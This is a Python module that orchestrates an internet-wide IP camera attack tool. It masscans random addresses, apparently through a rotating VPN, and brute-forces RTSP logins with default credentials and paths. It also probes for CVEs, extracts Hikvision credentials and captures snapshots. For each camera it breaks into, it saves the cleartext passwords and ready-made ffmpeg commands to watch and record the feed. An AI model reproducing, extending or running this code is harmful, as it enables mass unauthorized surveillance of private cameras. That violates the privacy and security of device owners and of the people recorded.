"""Asyncio orchestrator: discovery → RTSP auth → verify → log."""
from __future__ import annotations

import asyncio
import datetime
import json
import logging
import os
import re
import shutil
import time
import urllib.parse
from collections import defaultdict
from pathlib import Path
from typing import TYPE_CHECKING

from rich.progress import (BarColumn, MofNCompleteColumn, Progress,
                           SpinnerColumn, TextColumn, TimeElapsedColumn)

from .config import RunConfig
from .creds import load_creds, load_paths
from .discovery import masscan_scan, preflight
from .logging_setup import get_console
from .results import Result, ResultWriter
from .rtsp_client import AsyncRtspClient
from .targets import generate
from .verifier import verify
from .vulns import enrich, VULN_DEFS

if TYPE_CHECKING:
    from .events import EventBus

log = logging.getLogger("camscan.pipeline")

_BATCH = 10_000  # targets per masscan invocation in unlimited mode


def _classify_error(exc: BaseException) -> str:
    if isinstance(exc, asyncio.TimeoutError):
        return "timeout"
    if isinstance(exc, ConnectionRefusedError):
        return "conn_refused"
    if isinstance(exc, ConnectionResetError):
        return "conn_reset"
    if isinstance(exc, ConnectionError):
        return "conn_error"
    if isinstance(exc, (ValueError, UnicodeDecodeError)):
        return "malformed_response"
    if isinstance(exc, OSError):
        return f"os_error:{exc.errno}"
    return f"unknown:{type(exc).__name__}"


def _safe_filename(s: str) -> str:
    keep = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-")
    return "".join(c if c in keep else "_" for c in s).strip("_") or "root"


def _authed_url(ip: str, port: int, path: str, user: str, pw: str) -> str:
    if user or pw:
        u = urllib.parse.quote(user, safe="")
        p = urllib.parse.quote(pw, safe="")
        cred = f"{u}:{p}@"
    else:
        cred = ""
    if path and not path.startswith("/"):
        path = "/" + path
    return f"rtsp://{cred}{ip}:{port}{path}"


_NMAP_RTSP_PATH_RE = re.compile(r"rtsp://[^\s]+?(/[^\s]*)")


async def _nmap_rtsp_paths(ip: str, port: int, timeout: float = 30.0) -> list[str]:
    """Run nmap rtsp-url-brute and return discovered paths (may be empty on error)."""
    try:
        proc = await asyncio.create_subprocess_exec(
            "nmap", "--script", "rtsp-url-brute", "-p", str(port), ip,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return []
        paths: list[str] = []
        seen: set[str] = set()
        for m in _NMAP_RTSP_PATH_RE.finditer(stdout.decode(errors="replace")):
            p = m.group(1).rstrip()
            if p not in seen:
                seen.add(p)
                paths.append(p)
        return paths
    except FileNotFoundError:
        log.debug("nmap not found; skipping rtsp-url-brute")
        return []
    except Exception as e:
        log.debug("nmap rtsp-url-brute failed for %s:%d: %s", ip, port, e)
        return []


_NMAP_SV_SERVICE_RE = re.compile(r"\d+/tcp\s+open\s+\S+\s+(.*)")
_NMAP_SV_DEVICE_RE  = re.compile(r"Service Info:.*Device:\s*([^;]+)")
_NMAP_SV_CPE_RE     = re.compile(r"(cpe:/[^\s]+)")


async def _nmap_service_detect(ip: str, port: int,
                                timeout: float = 45.0) -> dict:
    """Run nmap -sV and return service/device/CPE strings (empty on any failure)."""
    empty = {"nmap_service": "", "nmap_device": "", "nmap_cpe": ""}
    try:
        proc = await asyncio.create_subprocess_exec(
            "nmap", "-sV", "-p", str(port), "--version-intensity", "5", ip,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return empty
        text = stdout.decode(errors="replace")
        nmap_service = ""
        nmap_device  = ""
        nmap_cpe     = ""
        m = _NMAP_SV_SERVICE_RE.search(text)
        if m:
            nmap_service = m.group(1).strip()
        m2 = _NMAP_SV_DEVICE_RE.search(text)
        if m2:
            nmap_device = m2.group(1).strip()
        m3 = _NMAP_SV_CPE_RE.search(text)
        if m3:
            nmap_cpe = m3.group(1).strip()
        if nmap_service or nmap_device:
            log.info("nmap -sV %s:%d  service=%r  device=%r  cpe=%r",
                     ip, port, nmap_service, nmap_device, nmap_cpe)
        return {"nmap_service": nmap_service,
                "nmap_device": nmap_device,
                "nmap_cpe": nmap_cpe}
    except FileNotFoundError:
        log.debug("nmap not found; skipping -sV")
        return empty
    except Exception as e:
        log.debug("nmap -sV failed for %s:%d: %s", ip, port, e)
        return empty


def _write_hit_folder(out_dir: Path, result: Result,
                      snapshot_path: str | None) -> Path:
    folder = out_dir / result.ip
    folder.mkdir(parents=True, exist_ok=True)
    stem = _safe_filename(f"stream_{result.port}_{result.endpoint}")
    url = _authed_url(result.ip, result.port, result.endpoint,
                      result.username, result.password)
    ts = datetime.datetime.utcfromtimestamp(result.ts).strftime("%Y-%m-%d %H:%M:%S UTC")
    txt = "\n".join([
        "=" * 58,
        "  VERIFIED RTSP STREAM",
        "=" * 58,
        f"  Found    : {ts}",
        f"  IP       : {result.ip}",
        f"  Port     : {result.port}",
        f"  Path     : {result.endpoint}",
        f"  Username : {result.username!r}",
        f"  Password : {result.password!r}",
        f"  Auth     : {result.auth_scheme}",
        f"  Tracks   : {result.sdp_tracks}",
        f"  Codecs   : {', '.join(result.codecs) or 'unknown'}",
        f"  Warnings : {', '.join(result.warnings) or 'none'}",
        f"  Fingerprint : {result.fingerprint or 'unknown'}",
        f"  Severity    : {result.severity or 'medium'}",
        "",
        "  VULNERABILITIES:",
        *([f"  [{VULN_DEFS.get(v,('medium',''))[0].upper()}] {v} — {VULN_DEFS.get(v,('medium',''))[1]}"
           for v in result.vulns]
          if result.vulns else ["  none detected"]),
        "",
        "  RTSP URL (authenticated):",
        f"  {url}",
        "",
        "  Live view:",
        f"  ffplay -rtsp_transport tcp '{url}'",
        "",
        "  Record + preview simultaneously:",
        f"  ffmpeg -rtsp_transport tcp -i '{url}' -c copy record_{result.ip}_{result.port}.mkv & ffplay -rtsp_transport tcp '{url}'",
        "  Record only MKV (lossless copy — works with any codec):",
        f"  ffmpeg -rtsp_transport tcp -i '{url}' -t 60 -c copy record_{result.ip}_{result.port}.mkv",
        "",
        "  Snapshot:",
        f"  ffmpeg -rtsp_transport tcp -i '{url}' -frames:v 1 -q:v 2 snap_{result.ip}_{result.port}.jpg",
        "",
        f"  Snapshot saved: {snapshot_path or 'none'}",
        "=" * 58,
    ])
    (folder / f"{stem}.txt").write_text(txt)
    (folder / f"{stem}.json").write_text(json.dumps({
        "ts": ts, "ip": result.ip, "port": result.port,
        "endpoint": result.endpoint,
        "username": result.username, "password": result.password,
        "auth_scheme": result.auth_scheme,
        "sdp_tracks": result.sdp_tracks, "codecs": result.codecs,
        "warnings": result.warnings, "rtsp_url": url,
        "ffplay_cmd": f"ffplay -rtsp_transport tcp '{url}'",
        "snapshot": snapshot_path or "",
        "unauth": result.unauth,
        "weak_auth": result.weak_auth,
        "vulns": result.vulns,
        "severity": result.severity,
        "fingerprint": result.fingerprint,
        "extracted_creds": getattr(result, "extracted_creds", []),
    }, indent=2))
    return folder


class Pipeline:
    def __init__(self, cfg: RunConfig, bus: "EventBus | None" = None):
        self.cfg = cfg
        self.bus = bus
        self.creds = load_creds(cfg.creds_file)
        self.paths = load_paths(cfg.paths_file)
        self.writer = ResultWriter(cfg.out_dir, cfg.run_id)
        self.global_sem = asyncio.Semaphore(cfg.concurrency)
        self.host_reset_count: dict[str, int] = defaultdict(int)
        self.host_blacklist: set[str] = set()
        self.attempts = 0
        self.errors = 0
        self.hits = 0
        self.hosts_found = 0
        self.start_time = time.time()
        self._stopping = False
        self._snapshot_tasks: list[asyncio.Task] = []

    def _public_stats(self) -> dict:
        return {
            "hits": self.hits,
            "hosts": self.hosts_found,
            "attempts": self.attempts,
            "errors": self.errors,
            "rate": self.attempts / max(1e-3, time.time() - self.start_time),
            "elapsed": time.time() - self.start_time,
        }

    def _emit(self, etype: str, data: dict) -> None:
        if self.bus:
            self.bus.emit(etype, data)

    def _log_emit(self, level: str, msg: str) -> None:
        self._emit("log", {"level": level, "msg": msg})

    _SNAP_FALLBACK_PATHS = [
        "/Streaming/Channels/1", "/Streaming/Channels/101",
        "/cam/realmonitor?channel=1&subtype=0",
        "/h264/ch1/main/av_stream", "/live", "/live.sdp",
        "/live/main", "/video0", "/0", "/1",
    ]

    async def _ffmpeg_snap(self, url: str, out_path: Path,
                           transport: str, timeout: float = 20.0) -> bool:
        try:
            proc = await asyncio.create_subprocess_exec(
                "ffmpeg",
                "-rtsp_transport", transport,
                "-i", url,
                "-frames:v", "1", "-q:v", "2", str(out_path), "-y",
                "-loglevel", "error",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.PIPE,
            )
            _, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            if proc.returncode == 0 and out_path.exists() and out_path.stat().st_size > 0:
                return True
            err = stderr.decode(errors="replace").strip()[:160]
            log.warning("ffmpeg [%s] %s → %s", transport, url, err)
            self._log_emit("WARNING", f"snap [{transport}] {url}: {err}")
        except asyncio.TimeoutError:
            log.warning("ffmpeg timeout [%s] %s", transport, url)
        except Exception as e:
            log.warning("ffmpeg error [%s] %s: %s", transport, url, e)
        return False

    async def _take_snapshot(self, result: Result) -> str | None:
        if not (self.cfg.snapshots and shutil.which("ffmpeg")):
            return None
        folder = self.cfg.out_dir / result.ip
        try:
            folder.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            log.warning("snapshot mkdir failed %s: %s", folder, e)
            return None
        safe = _safe_filename(f"snapshot_{result.port}_{result.endpoint}")
        out_path = folder / f"{safe}.jpg"
        base_url = _authed_url(result.ip, result.port, result.endpoint,
                               result.username, result.password)
        is_root = result.endpoint.rstrip("/") in ("", "/")
        candidates = [base_url]
        if is_root:
            for p in self._SNAP_FALLBACK_PATHS:
                candidates.append(_authed_url(result.ip, result.port, p,
                                              result.username, result.password))
        for url in candidates:
            for transport in ("tcp", "udp"):
                if await self._ffmpeg_snap(url, out_path, transport):
                    log.info("snapshot saved [%s] %s", transport, out_path)
                    self._log_emit("INFO",
                                   f"snapshot saved {result.ip}:{result.port}")
                    return str(out_path)
        log.info("snapshot failed all attempts %s:%d", result.ip, result.port)
        self._log_emit("INFO",
                       f"snapshot failed {result.ip}:{result.port}")
        return None

    async def _finalize_hit(self, result: Result, hit: dict) -> None:
        """Post-hit enrichment: HTTP vuln probing, snapshot, folder write.

        Runs in background after the hit is already durably recorded.
        Never delays or blocks the hit card appearing in the UI.
        """
        try:
            # ── HTTP enrichment + CVE probing ─────────────────────────────
            try:
                er = await enrich(result.ip,
                                  existing_fingerprint=result.fingerprint,
                                  timeout=self.cfg.timeout)
                if er.fingerprint and not result.fingerprint:
                    result.fingerprint = er.fingerprint
                    hit["fingerprint"] = er.fingerprint

                if er.new_vulns:
                    result.vulns = list(dict.fromkeys(result.vulns + er.new_vulns))
                    hit["vulns"] = result.vulns
                    # Recalculate severity — worst wins
                    _order = {"critical": 4, "high": 3, "medium": 2, "info": 1, "": 0}
                    for v in result.vulns:
                        sev = VULN_DEFS.get(v, ("medium", ""))[0]
                        if _order.get(sev, 0) > _order.get(result.severity, 0):
                            result.severity = sev
                    hit["severity"] = result.severity

                    vuln_msg = (f"VULNS {result.ip}  brand={er.fingerprint or '?'}  "
                                f"vulns={','.join(result.vulns)}  "
                                f"severity={result.severity}")
                    log.warning(vuln_msg)
                    self._log_emit("WARNING", vuln_msg)
                    for note in er.cve_notes:
                        log.warning("CVE NOTE %s: %s", result.ip, note)
                        self._log_emit("WARNING", note)
                    # Push updated vuln data to UI
                    self._emit("vuln_update", {
                        "ip": result.ip, "port": result.port,
                        "fingerprint": result.fingerprint,
                        "vulns": result.vulns,
                        "severity": result.severity,
                        "cve_notes": er.cve_notes,
                        "extracted_creds": er.extracted_creds,
                    })

                # Surface extracted credentials
                if er.extracted_creds:
                    hit["extracted_creds"] = er.extracted_creds
                    result.extracted_creds = list(er.extracted_creds)
                    result.vulns = list(dict.fromkeys(
                        result.vulns + ["hikvision_cred_extracted"]))
                    cred_msg = (f"CREDS EXTRACTED {result.ip}: "
                                + ", ".join(er.extracted_creds[:5]))
                    log.warning(cred_msg)
                    self._log_emit("WARNING", cred_msg)
                if er.cve_notes:
                    result.cve_notes = list(er.cve_notes)

                # Save unauth HTTP snapshot alongside RTSP snapshot
                if er.http_snapshot_bytes and er.http_snapshot_url:
                    hit["http_snapshot_url"] = er.http_snapshot_url
                    try:
                        folder = self.cfg.out_dir / result.ip
                        folder.mkdir(parents=True, exist_ok=True)
                        http_snap_path = folder / "http_snapshot.jpg"
                        http_snap_path.write_bytes(er.http_snapshot_bytes)
                        hit["http_snapshot_path"] = str(http_snap_path)
                        log.warning("http snapshot saved: %s", http_snap_path)
                        self._log_emit("WARNING",
                                       f"http snapshot: {http_snap_path}")
                    except OSError as e:
                        log.warning("http snapshot save failed: %s", e)

            except Exception as e:
                log.info("http enrichment failed %s: %s", result.ip, e)

            # ── nmap -sV service detection ────────────────────────────────
            if self.cfg.nmap_sv:
                try:
                    nmap_info = await _nmap_service_detect(result.ip, result.port)
                    if any(nmap_info.values()):
                        hit.update(nmap_info)
                        self._emit("nmap_update", {
                            "ip": result.ip, "port": result.port,
                            **nmap_info,
                        })
                except Exception as e:
                    log.debug("nmap_sv finalize failed %s: %s", result.ip, e)

            # ── RTSP snapshot ────────────────────────────────────────────
            snapshot_path = await self._take_snapshot(result)
            hit["snapshot"] = snapshot_path

            # ── Per-IP folder ────────────────────────────────────────────
            try:
                folder = _write_hit_folder(self.cfg.out_dir, result, snapshot_path)
                log.warning("hit folder: %s", folder)
                self._log_emit("WARNING", f"hit folder: {folder}")
            except OSError as e:
                log.error("hit folder write failed %s: %s", result.ip, e)
                self._log_emit("ERROR", f"hit folder write failed: {e}")

            if snapshot_path:
                self._emit("snapshot_saved", {
                    "ip": result.ip, "port": result.port,
                    "path": snapshot_path,
                })

        except Exception as e:
            log.error("finalize_hit crashed for %s: %s", result.ip, e, exc_info=True)
            self._log_emit("ERROR", f"finalize_hit error {result.ip}: {e}")

    async def _host_worker(self, ip: str, port: int,
                           work: list[tuple[tuple[str, str], str]],
                           stop_host: asyncio.Event,
                           progress, task_id) -> None:
        key = f"{ip}:{port}"
        cli: AsyncRtspClient | None = None

        async def _open() -> AsyncRtspClient | None:
            c = AsyncRtspClient(ip, port, self.cfg.timeout,
                                trace=self.cfg.verbosity >= 3)
            try:
                await c.__aenter__()
                return c
            except Exception:
                return None

        async def _close(c: AsyncRtspClient) -> None:
            try:
                await c.__aexit__(None, None, None)
            except Exception:
                pass

        consec_404 = 0  # consecutive 404s with no auth challenge — host has no streams
        try:
            for cred, path in work:
                if stop_host.is_set() or self._stopping or key in self.host_blacklist:
                    if progress:
                        progress.advance(task_id)
                    continue

                result = Result(run_id=self.cfg.run_id, ip=ip, port=port,
                                endpoint=path, username=cred[0], password=cred[1],
                                rtsp_url=f"rtsp://{ip}:{port}{path}")
                t0 = time.perf_counter()

                async with self.global_sem:
                    try:
                        if cli is None:
                            cli = await _open()
                            if cli is None:
                                result.error = "conn_refused"
                                self.errors += 1
                                # Signal sibling workers so they drain progress quickly,
                                # then exit this worker — no point retrying every cred.
                                stop_host.set()
                                break

                        resp, scheme = await cli.describe(path, cred)
                        result.rtsp_status = resp.status
                        result.auth_scheme = scheme
                        result.sdp_present = bool(resp.body)

                        # Track consecutive 404s — a real camera that has any
                        # streams will return 401 (needs auth) not 404 (path missing).
                        # After 6 straight 404s with no auth challenge we know this
                        # host isn't a camera with accessible streams.
                        if resp.status == 404:
                            consec_404 += 1
                            if consec_404 >= 6:
                                stop_host.set()
                                log.debug("404 streak on %s:%d, skipping remaining attempts", ip, port)
                        elif resp.status in (200, 401, 403):
                            consec_404 = 0  # reset on any meaningful auth response

                        if resp.status == 200:
                            v = verify(ip, resp.status, resp.body)
                            result.sdp_tracks = v.tracks
                            result.codecs = v.codecs
                            result.warnings = v.warnings
                            result.verified = v.ok
                            if v.ok:
                                self.hits += 1
                                stop_host.set()
                                url = _authed_url(ip, port, path, cred[0], cred[1])
                                msg = (f"VERIFIED {url}  user={cred[0]!r}  "
                                       f"pass={cred[1]!r}  tracks={v.tracks}  "
                                       f"codecs={','.join(v.codecs) or '?'}")
                                log.warning(msg)
                                self._log_emit("WARNING", msg)

                                # Vulnerability / exploitation metadata (high-value for
                                # "masterpiece" version — unauth and weak default creds
                                # are the most common real-world wins).
                                is_unauth = (cred[0] == "" and cred[1] == "")
                                is_weak = bool(cred[1]) and (
                                    len(cred[1]) <= 5 or
                                    cred[1] in ("admin", "12345", "password", "123456",
                                                "root", "toor", "888888", "666666",
                                                "1111", "0000", "9999", "54321")
                                )
                                vulns: list[str] = []
                                if is_unauth:
                                    vulns.append("unauth_rtsp_access")
                                if is_unauth or is_weak:
                                    vulns.append("weak_default_creds")
                                severity = "critical" if is_unauth else ("high" if is_weak else "medium")
                                fingerprint = "rtsp-camera-default"

                                result.unauth = is_unauth
                                result.weak_auth = is_weak
                                result.vulns = vulns
                                result.severity = severity
                                result.fingerprint = fingerprint

                                hit = {
                                    "ts": result.ts,
                                    "ip": ip, "port": port,
                                    "endpoint": path,
                                    "username": cred[0],
                                    "password": cred[1],
                                    "auth_scheme": scheme,
                                    "sdp_tracks": v.tracks,
                                    "codecs": v.codecs,
                                    "rtsp_url": url,
                                    "ffplay_cmd": f"ffplay -rtsp_transport tcp '{url}'",
                                    "snapshot": None,
                                    "unauth": is_unauth,
                                    "weak_auth": is_weak,
                                    "vulns": vulns,
                                    "severity": severity,
                                    "fingerprint": fingerprint,
                                }
                                # Emit hit immediately — durable before any slow work.
                                # web.py's register_hit subscribes via the bus and
                                # appends to _state.hits + persists to hits.jsonl.
                                self._emit("hit", hit)

                                # Also write a dedicated per-run hits file (headless + web
                                # friendly). Append + flush + fsync for durability so
                                # verified hits are never lost even on crash/power loss.
                                try:
                                    hits_file = (self.cfg.out_dir /
                                                 f"{self.cfg.run_id}-hits.jsonl")
                                    with hits_file.open("a", encoding="utf-8") as fh:
                                        fh.write(json.dumps(hit, default=str) + "\n")
                                        fh.flush()
                                        try:
                                            os.fsync(fh.fileno())
                                        except Exception:
                                            pass  # best-effort durability
                                except Exception as e:
                                    log.warning("per-run hits write failed %s: %s",
                                                result.ip, e)
                                    self._log_emit("WARNING",
                                                   f"per-run hits write failed: {e}")

                                t = asyncio.create_task(
                                    self._finalize_hit(result, hit))
                                self._snapshot_tasks.append(t)

                        log.debug("attempt %s:%d%s [%s:%s] -> %s / %s",
                                  ip, port, path,
                                  cred[0] or "<empty>", cred[1] or "<empty>",
                                  result.rtsp_status, result.auth_scheme)

                    except Exception as e:
                        result.error = _classify_error(e)
                        self.errors += 1
                        if result.error in ("conn_reset", "conn_error", "conn_refused"):
                            if cli:
                                await _close(cli)
                                cli = None
                        if result.error == "conn_reset":
                            self.host_reset_count[key] += 1
                            if self.host_reset_count[key] >= 3:
                                self.host_blacklist.add(key)
                                msg = f"backing off {key} after repeated resets"
                                log.info(msg)
                                self._log_emit("INFO", msg)
                        log.debug("attempt error %s:%d%s [%s:%s] -> %s",
                                  ip, port, path,
                                  cred[0] or "<empty>", cred[1] or "<empty>",
                                  result.error)
                    finally:
                        result.elapsed_ms = int((time.perf_counter() - t0) * 1000)
                        self.attempts += 1
                        await self.writer.write(result)
                        if progress:
                            progress.advance(task_id)
        finally:
            if cli:
                await _close(cli)

    async def _process_host(self, ip: str, port: int, progress, task_id) -> None:
        key = f"{ip}:{port}"
        # Probe is advisory only (many cameras are picky about OPTIONS or close
        # connections quickly). We always proceed to credentialed DESCRIBE
        # attempts so masscan "hits" are never silently skipped.
        probe_status = 0
        try:
            async with AsyncRtspClient(ip, port, self.cfg.timeout) as cli:
                opts = await cli.options()
                probe_status = opts.status
                msg = (f"rtsp probe {ip}:{port}  status={opts.status}  "
                       f"methods=[{opts.header('public') or '—'}]")
                log.info(msg)
                self._log_emit("INFO", msg)
        except Exception as e:
            log.debug("probe failed %s:%d -> %s (proceeding to brute anyway)",
                      ip, port, _classify_error(e))

        # Skip hosts that refused/reset during probe — they're not RTSP servers.
        # 404 from OPTIONS is ambiguous (some cameras do this) so we still try them,
        # but 0 (connection refused/timeout) means nothing is listening.
        if probe_status == 0 and key in self.host_blacklist:
            return

        # Optionally run nmap rtsp-url-brute, but only on hosts that responded
        # 200 or 401 to OPTIONS — genuine RTSP servers. 404/0 hosts waste 30s
        # each and never yield a verified stream worth the nmap overhead.
        paths = self.paths
        if self.cfg.nmap_brute and probe_status in (200, 401):
            discovered = await _nmap_rtsp_paths(ip, port)
            if discovered:
                known = set(paths)
                extra = [p for p in discovered if p not in known]
                if extra:
                    msg = f"nmap found {len(extra)} new path(s) on {ip}:{port}: {extra}"
                    log.info(msg)
                    self._log_emit("INFO", msg)
                # Use ONLY nmap-discovered paths when there are many of them —
                # they're specific to this host and cover far more than the static
                # list. Keep static list only when nmap found very few paths.
                if len(discovered) >= 10:
                    paths = discovered
                else:
                    paths = discovered + [p for p in paths if p not in set(discovered)]

        # Unauth fast path: try ("","") against the top 5 most common paths first.
        # Unauth cameras respond 200 immediately — no need to burn time on creds.
        UNAUTH = ("", "")
        top_paths = paths[:5]
        unauth_fast = [(UNAUTH, p) for p in top_paths if UNAUTH in self.creds]

        # Main attempt list: paths outer, creds inner (all creds vs each path).
        # Exclude unauth fast-path combos from the main list to avoid duplication.
        fast_set = set((p,) for (_, p) in unauth_fast)
        creds_no_unauth = [c for c in self.creds if c != UNAUTH]
        # For paths already in fast path: creds without unauth; for remaining paths: all creds
        main_attempts = []
        for p in paths:
            if (p,) in fast_set:
                main_attempts.extend((c, p) for c in creds_no_unauth)
            else:
                main_attempts.extend((c, p) for c in self.creds)

        all_attempts = unauth_fast + main_attempts

        base_cap = self.cfg.max_attempts_per_host or 60
        # When nmap found host-specific paths, raise cap to cover up to 10 paths × all creds
        cap = max(base_cap, min(len(paths), 10) * len(self.creds)) if self.cfg.nmap_brute and probe_status in (200, 401) else base_cap
        all_attempts = all_attempts[:cap]

        if progress:
            progress.update(task_id,
                            total=(progress.tasks[task_id].total or 0) + len(all_attempts))

        n = self.cfg.per_host_concurrency
        stop_host = asyncio.Event()
        slices = [all_attempts[i::n] for i in range(n) if all_attempts[i::n]]
        workers = [asyncio.create_task(
            self._host_worker(ip, port, sl, stop_host, progress, task_id))
            for sl in slices]
        await asyncio.gather(*workers, return_exceptions=True)

    async def _scan_batch(self, targets: list[str],
                          host_tasks: list, progress, task_id) -> None:
        async for ip, port in masscan_scan(targets, self.cfg.rtsp_ports, self.cfg.rate):
            if self._stopping:
                break
            self.hosts_found += 1
            if progress:
                progress.advance(task_id)
            msg = f"hit {ip}:{port}"
            log.info(msg)
            self._log_emit("INFO", msg)
            host_tasks.append(asyncio.create_task(
                self._process_host(ip, port, progress, task_id)))

    async def _ticker(self, progress, task_id) -> None:
        try:
            while not self._stopping:
                await asyncio.sleep(1.0)
                stats = self._public_stats()
                if progress:
                    progress.update(task_id,
                                    hits=stats["hits"], err=stats["errors"],
                                    hosts=stats["hosts"], rate=stats["rate"])
                self._emit("stats", stats)
        except asyncio.CancelledError:
            pass

    async def run(self) -> None:
        preflight()
        self.cfg.log_dir.mkdir(parents=True, exist_ok=True)

        # Set up structured logging to file
        from .logging_setup import setup_logging
        setup_logging(self.cfg.log_dir / f"{self.cfg.run_id}.jsonl",
                      self.cfg.verbosity, self.cfg.json_only)

        log.warning("run %s | unlimited=%s | count=%d | creds=%d | paths=%d",
                    self.cfg.run_id, self.cfg.unlimited, self.cfg.count,
                    len(self.creds), len(self.paths))
        self._emit("log", {"level": "WARNING",
                            "msg": f"run {self.cfg.run_id} started"})

        use_rich = not self.cfg.json_only and not self.bus
        progress = None
        task_id = None
        if use_rich:
            progress = Progress(
                SpinnerColumn(),
                TextColumn("[bold]{task.description}"),
                BarColumn(),
                MofNCompleteColumn(),
                TextColumn("hits=[green]{task.fields[hits]}[/green]  "
                           "err=[red]{task.fields[err]}[/red]  "
                           "hosts={task.fields[hosts]}  rate={task.fields[rate]:.0f}/s"),
                TimeElapsedColumn(),
                console=get_console(), transient=False,
            )
            total = self.cfg.count if not self.cfg.unlimited else 0
            task_id = progress.add_task("scanning", total=total or None,
                                        hits=0, err=0, hosts=0, rate=0.0)

        host_tasks: list[asyncio.Task] = []

        async def _body():
            ticker = asyncio.create_task(self._ticker(progress, task_id))
            try:
                if self.cfg.unlimited:
                    from .discovery import MasscanError
                    _iface_errors = 0
                    while not self._stopping:
                        batch = list(generate(_BATCH, self.cfg.mode, self.cfg.seed,
                                              us_only=self.cfg.us_only))
                        try:
                            await self._scan_batch(batch, host_tasks, progress, task_id)
                            _iface_errors = 0  # reset on success
                        except MasscanError as e:
                            err_str = str(e)
                            # Interface errors are transient — Mullvad is rotating.
                            # Wait for the new interface to come up then retry.
                            if any(kw in err_str for kw in
                                   ("interface", "No such device", "if:", "activate")):
                                _iface_errors += 1
                                wait = min(5 * _iface_errors, 30)
                                msg = (f"masscan interface error (Mullvad rotating?) "
                                       f"— retrying in {wait}s [{_iface_errors}]")
                                log.warning(msg)
                                self._log_emit("WARNING", msg)
                                await asyncio.sleep(wait)
                                continue
                            # Fatal masscan error — stop
                            msg = f"masscan failed: {err_str} — stopping"
                            log.error(msg)
                            self._log_emit("ERROR", msg)
                            self._stopping = True
                            break
                        host_tasks[:] = [t for t in host_tasks if not t.done()]
                    if host_tasks:
                        await asyncio.gather(*host_tasks, return_exceptions=True)
                else:
                    all_targets = (list(generate(self.cfg.count, self.cfg.mode,
                                                 self.cfg.seed,
                                                 us_only=self.cfg.us_only))
                                   + list(self.cfg.extra_targets))
                    await self._scan_batch(all_targets, host_tasks, progress, task_id)
                    if host_tasks:
                        await asyncio.gather(*host_tasks, return_exceptions=True)

                if self._snapshot_tasks:
                    log.warning("waiting for %d snapshot(s)…",
                                len(self._snapshot_tasks))
                    await asyncio.gather(*self._snapshot_tasks,
                                         return_exceptions=True)
            finally:
                self._stopping = True
                ticker.cancel()
                try:
                    await ticker
                except asyncio.CancelledError:
                    pass

        if progress:
            with progress:
                await _body()
        else:
            await _body()

        summary = (f"done | run={self.cfg.run_id} | "
                   f"targets={'∞' if self.cfg.unlimited else self.cfg.count} | "
                   f"hosts={self.hosts_found} | attempts={self.attempts} | "
                   f"verified={self.hits} | errors={self.errors} | "
                   f"elapsed={time.time()-self.start_time:.1f}s")
        log.warning(summary)
        self._log_emit("WARNING", summary)
        self.writer.close()

    def request_stop(self) -> None:
        self._stopping = True
